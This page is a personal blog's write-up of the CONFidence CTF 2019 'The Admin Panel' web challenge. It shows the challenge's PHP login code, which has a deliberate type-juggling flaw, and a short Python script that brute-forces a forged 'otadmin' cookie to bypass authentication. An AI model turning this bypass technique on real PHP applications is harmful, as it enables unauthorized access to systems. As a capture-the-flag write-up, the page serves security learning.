@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <!-- Head -->
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">    <!-- Metadata, OpenGraph and Schema.org -->
+    
+
+    <!-- Standard metadata -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>CONFidence CTF 2019 'The Admin Panel' Writeup | Gokul Krishna</title>
+    <meta name="author" content="Gokulkrishna P. Menon">
+    <meta name="description" content="A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design.
+">
+    <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website">
+
+
+    <!-- Bootstrap & MDB -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha256-DF7Zhf293AJxJNTmh5zhoYYIMs2oXitRfBjY+9L//AY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous">
+
+    <!-- Fonts & Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.1/css/academicons.min.css" integrity="sha256-i1+4qU2G2860dGGIOJscdC30s9beBXjFfzjWLjBRsBg=" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700%7CRoboto+Slab:100,300,400,500,700%7CMaterial+Icons">
+
+    <!-- Code Syntax Highlighting -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/github.css" media="" id="highlight_theme_light">
+
+    <!-- Styles -->
+    
+    <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;">
+    
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="canonical" href="https://g0kkk.github.io/blog/2019/CONFidence-CTF-admin-panel/">
+    
+    <!-- Dark Mode -->
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/native.css" media="none" id="highlight_theme_dark">
+
+    <script src="/assets/js/theme.js"></script>
+    <script src="/assets/js/dark_mode.js"></script>
+    
+
+  </head>
+
+  <!-- Body -->
+  <body class="fixed-top-nav ">
+
+    <!-- Header -->
+    <header>
+
+      <!-- Nav Bar -->
+      <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top">
+        <div class="container">
+          <a class="navbar-brand title font-weight-lighter" href="/">Gokul Krishna</a>
+          <!-- Navbar Toggle -->
+          <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar top-bar"></span>
+            <span class="icon-bar middle-bar"></span>
+            <span class="icon-bar bottom-bar"></span>
+          </button>
+
+          <div class="collapse navbar-collapse text-right" id="navbarNav">
+            <ul class="navbar-nav ml-auto flex-nowrap">
+
+              <!-- About -->
+              <li class="nav-item ">
+                <a class="nav-link" href="/">about</a>
+              </li>
+              
+              <!-- Blog -->
+              <li class="nav-item active">
+                <a class="nav-link" href="/blog/">blog<span class="sr-only">(current)</span></a>
+              </li>
+
+              <!-- Other pages -->
+              <li class="nav-item ">
+                <a class="nav-link" href="/publications/">publications</a>
+              </li>
+              <li class="nav-item ">
+                <a class="nav-link" href="/projects/">projects</a>
+              </li>
+              <li class="nav-item ">
+                <a class="nav-link" href="/repositories/">repositories</a>
+              </li>
+              <li class="nav-item ">
+                <a class="nav-link" href="/cv/">cv</a>
+              </li>
+              <li class="nav-item ">
+                <a class="nav-link" href="/teaching/">teaching</a>
+              </li>
+              <li class="nav-item dropdown ">
+                <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus</a>
+                <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/publications/">publications</a>
+                  <div class="dropdown-divider"></div>
+                  <a class="dropdown-item" href="/projects/">projects</a>
+                </div>
+              </li>
+
+              <!-- Toogle theme mode -->
+              <li class="toggle-container">
+                <button id="light-toggle" title="Change theme">
+                  <i class="fas fa-moon"></i>
+                  <i class="fas fa-sun"></i>
+                </button>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </nav>
+
+      <!-- Scrolling Progress Bar -->
+      <progress id="progress" value="0">
+        <div class="progress-container">
+          <span class="progress-bar"></span>
+        </div>
+      </progress>
+    </header>
+
+
+    <!-- Content -->
+    <div class="container mt-5">
+      <!-- _layouts/post.html -->
+
+<div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">CONFidence CTF 2019 'The Admin Panel' Writeup</h1>
+    <p class="post-meta">March 16, 2019</p>
+    <p class="post-tags">
+      <a href="/blog/2019"> <i class="fas fa-calendar fa-sm"></i> 2019 </a>
+        ·  
+        <a href="/blog/tag/web-type-juggling">
+          <i class="fas fa-hashtag fa-sm"></i> Web, type juggling</a>  
+          
+
+    </p>
+  </header>
+
+  <article class="post-content">
+    <p>Right after iCTF, there was Confidence CTF going on by P4! I was kinda late to look into the challenges and there was hardly ~3 hours left. I went with the one which had most solves, <strong>The Admin Panel</strong>.
+<br><br></p>
+
+<figure class="foto-legenda">
+	<img src="../assets/conf/ChalDesc.png" alt="">
+</figure>
+
+<p><br>
+<br>
+We were greeted with a normal directory listing page where we had two files, <code class="language-plaintext highlighter-rouge">login.php</code> &amp; <code class="language-plaintext highlighter-rouge">login.php.bak</code>.<br><br></p>
+
+<figure class="foto-legenda">
+	<img src="../assets/conf/welcomescreen.png" alt="">
+</figure>
+
+<p><br><br></p>
+
+<p>I decided to take up as usual, <code class="language-plaintext highlighter-rouge">login.php</code>, but had the message pop up <code class="language-plaintext highlighter-rouge">Not authenticated.</code>. <br>
+<br>
+<br></p>
+
+<figure class="foto-legenda">
+	<img src="../assets/conf/notauth.png" alt="">
+</figure>
+
+<p><br>
+<br></p>
+
+<p>Fair enough, I downloaded the <code class="language-plaintext highlighter-rouge">login.php.bak</code> and we have the source code with us!<br><br></p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<span class="k">include</span> <span class="s1">'../func.php'</span><span class="p">;</span>
+<span class="k">include</span> <span class="s1">'../config.php'</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'otadmin'</span><span class="p">])</span> <span class="p">{</span>
+    <span class="k">exit</span><span class="p">(</span><span class="s2">"Not authenticated.</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^{"hash": [0-9A-Z\"]+}$/'</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'otadmin'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"COOKIE TAMPERING xD IM A SECURITY EXPERT</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="k">exit</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="nv">$session_data</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="err">$\</span><span class="n">_COOKIE</span><span class="p">[</span><span class="s1">'otadmin'</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$session_data</span> <span class="o">===</span> <span class="kc">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"COOKIE TAMPERING xD IM A SECURITY EXPERT</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">exit</span><span class="p">();</span> <span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$session_data</span><span class="p">[</span><span class="s1">'hash'</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nb">MD5</span><span class="p">(</span><span class="nv">$cfg_pass</span><span class="p">)))</span> <span class="p">{</span>
+    <span class="k">echo</span><span class="p">(</span><span class="s2">"I CAN EVEN GIVE YOU A HINT XD </span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nb">MD5</span><span class="p">(</span><span class="s1">'xDdddddd'</span><span class="p">));</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nb">MD5</span><span class="p">(</span><span class="nv">$cfg_pass</span><span class="p">)[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xC0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">exit</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nf">display_admin</span><span class="p">();</span></code></pre></figure>
+
+<p><br>
+<br>
+Diving into the source code step by step, the <code class="language-plaintext highlighter-rouge">Not authenticated.</code> message comes out as the cookie, <code class="language-plaintext highlighter-rouge">otadmin</code> is not there. Okay, good enough, I decided to create a cookie named <code class="language-plaintext highlighter-rouge">otadmin</code>.</p>
+
+<p>After having that moved into the page, I was greeted with the next message which was <code class="language-plaintext highlighter-rouge">COOKIE TAMPERING xD IM A SECURITY EXPERT</code>. So looking at that comparison, I understood that the cookie must have a key-value paid of <code class="language-plaintext highlighter-rouge">hash</code> as key and alphanumeric characters as value in it. And the very next line gets <code class="language-plaintext highlighter-rouge">$session_data</code> as a json decoded object. <br></p>
+
+<p>I then decided to create a new cookie <code class="language-plaintext highlighter-rouge">otadmin</code> with value <code class="language-plaintext highlighter-rouge">{"hash": ""}</code>.</p>
+
+<p>Well, that threw me the result of the next condition, which we eventually need to bypass. But without knowing what <code class="language-plaintext highlighter-rouge">$cfg_pass</code> is, it is rather bs. <br></p>
+
+<p>As a result, the hint was nothing but <br></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I CAN EVEN GIVE YOU A HINT XD 0006464640640064000646464640006400640640646400
+</code></pre></div></div>
+<p><br>
+<br></p>
+
+<p>Now we know what the hint is, what the for loop does, the interesting part was the last comparison was vulnerable to a loose comparison or rather <a href="https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf" rel="external nofollow noopener" target="_blank"><strong>type juggling</strong></a>. The loose comparison would rather do something like: <em><strong>When comparing a string to a number, PHP will attempt to convert the string to a number then perform a numeric comparison</strong></em>.</p>
+
+<p><br>
+Good enough, makes it more easier not to bruteforce the md5 result and bypassing that is the only thing which is required now. From the hint, we know that the first three are <code class="language-plaintext highlighter-rouge">0</code> and hence having a value for hash in the range of 999 can do the trick that is required.</p>
+
+<p><br></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#Author: gokul
+</span><span class="kn">import</span> <span class="n">requests</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s">""</span>                                              <span class="c1">#point to the chal location
+</span>
+<span class="k">with</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">999</span><span class="p">):</span>
+        <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">'otadmin'</span><span class="p">:</span><span class="s">'{"hash": '</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">'}'</span><span class="p">}</span>  <span class="c1">#passing on the cookie
+</span>        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>           
+        <span class="k">if</span> <span class="s">'p4'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>                            <span class="c1">#checking for flag which starts with p4, likely to be in display_admin()
+</span>            <span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="k">break</span></code></pre></figure>
+
+<p>Reach me out on <a href="https://twitter.com/gkgkrishna33" rel="external nofollow noopener" target="_blank"><strong>Twitter</strong></a> for any questions! Cheers.</p>
+
+  </article>
+
+
+  
+    
+    <br>
+    <hr>
+    <br>
+    <ul class="list-disc pl-8"></ul>
+
+    <!-- Adds related posts to the end of an article -->
+    <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2>
+    <p class="mb-2">Here are some more articles you might like to read next:</p>
+  
+
+  <li class="my-2">
+    <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2019/iCTF-2019-Echodoor/">iCTF 2019 Echodoor</a>
+  </li>
+
+  
+
+  <li class="my-2">
+    <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2018/SECT-2018-EzDOS/">SECT 2018 EzDOS Reversing Challenge</a>
+  </li>
+
+  
+
+  <li class="my-2">
+    <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2018/ASIS-CTF-Quals-2018-Good-WAF/">ASIS Quals 2018 Good WAF</a>
+  </li>
+
+  
+
+  <li class="my-2">
+    <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2018/MacOS-Malware/">Search Page Injection Malware on MacOS </a>
+  </li>
+
+  
+
+  <li class="my-2">
+    <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2018/0CTF-Quals-2018-EZDoor/">0CTF 2018 EZdoor Web Challenge</a>
+  </li>
+
+</div>
+
+    </div>
+
+    <!-- Footer -->    
+    <footer class="fixed-bottom">
+      <div class="container mt-0">
+        © Copyright 2023 Gokulkrishna P. Menon. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank" rel="external nofollow noopener">Unsplash</a>.
+
+      </div>
+    </footer>
+
+    <!-- JavaScripts -->
+    <!-- jQuery -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+
+    <!-- Bootsrap & MDB scripts -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha256-fgLAgv7fyCGopR/gBNq2iW3ZKIdqIcyshnUULC4vex8=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script>
+
+    <!-- Masonry & imagesLoaded -->
+  <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script>
+  <script defer src="/assets/js/masonry.js" type="text/javascript"></script>
+    
+  <!-- Medium Zoom JS -->
+  <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.8/dist/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
+  <script defer src="/assets/js/zoom.js"></script><!-- Load Common JS -->
+  <script defer src="/assets/js/common.js"></script>
+  <script defer src="/assets/js/copy_code.js" type="text/javascript"></script>
+
+    
+  <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script>
+  <script async src="https://badge.dimensions.ai/badge.js"></script>
+
+    <!-- MathJax -->
+  <script type="text/javascript">
+    window.MathJax = {
+      tex: {
+        tags: 'ams'
+      }
+    };
+  </script>
+  <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script>
+  <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+
+    
+    
+
+<!-- Scrolling Progress Bar -->
+<script type="text/javascript">
+  /*
+   * This JavaScript code has been adapted from the article 
+   * https://css-tricks.com/reading-position-indicator/ authored by Pankaj Parashar, 
+   * published on the website https://css-tricks.com on the 7th of May, 2014.
+   * Couple of changes were made to the original code to make it compatible 
+   * with the `al-foio` theme.
+   */
+  const progressBar = $("#progress");
+  /*
+   * We set up the bar after all elements are done loading.
+   * In some cases, if the images in the page are larger than the intended
+   * size they'll have on the page, they'll be resized via CSS to accomodate
+   * the desired size. This mistake, however, breaks the computations as the
+   * scroll size is computed as soon as the elements finish loading.
+   * To account for this, a minimal delay was introduced before computing the
+   * values.
+   */
+  window.onload = function () {
+    setTimeout(progressBarSetup, 50);
+  };
+  /*
+   * We set up the bar according to the browser.
+   * If the browser supports the progress element we use that.
+   * Otherwise, we resize the bar thru CSS styling
+   */
+  function progressBarSetup() {
+    if ("max" in document.createElement("progress")) {
+      initializeProgressElement();
+      $(document).on("scroll", function() {
+        progressBar.attr({ value: getCurrentScrollPosition() });
+      });
+      $(window).on("resize", initializeProgressElement);
+    } else {
+      resizeProgressBar();
+      $(document).on("scroll", resizeProgressBar);
+      $(window).on("resize", resizeProgressBar);
+    }
+  }
+  /*
+   * The vertical scroll position is the same as the number of pixels that
+   * are hidden from view above the scrollable area. Thus, a value > 0 is
+   * how much the user has scrolled from the top
+   */
+  function getCurrentScrollPosition() {
+    return $(window).scrollTop();
+  }
+
+  function initializeProgressElement() {
+    let navbarHeight = $("#navbar").outerHeight(true);
+    $("body").css({ "padding-top": navbarHeight });
+    $("progress-container").css({ "padding-top": navbarHeight });
+    progressBar.css({ top: navbarHeight });
+    progressBar.attr({
+      max: getDistanceToScroll(),
+      value: getCurrentScrollPosition(),
+    });
+  }
+  /*
+   * The offset between the html document height and the browser viewport
+   * height will be greater than zero if vertical scroll is possible.
+   * This is the distance the user can scroll
+   */
+  function getDistanceToScroll() {
+    return $(document).height() - $(window).height();
+  }
+
+  function resizeProgressBar() {
+    progressBar.css({ width: getWidthPercentage() + "%" });
+  }
+  // The scroll ratio equals the percentage to resize the bar
+  function getWidthPercentage() {
+    return (getCurrentScrollPosition() / getDistanceToScroll()) * 100;
+  }
+</script>
+
+  </body>
+</html>
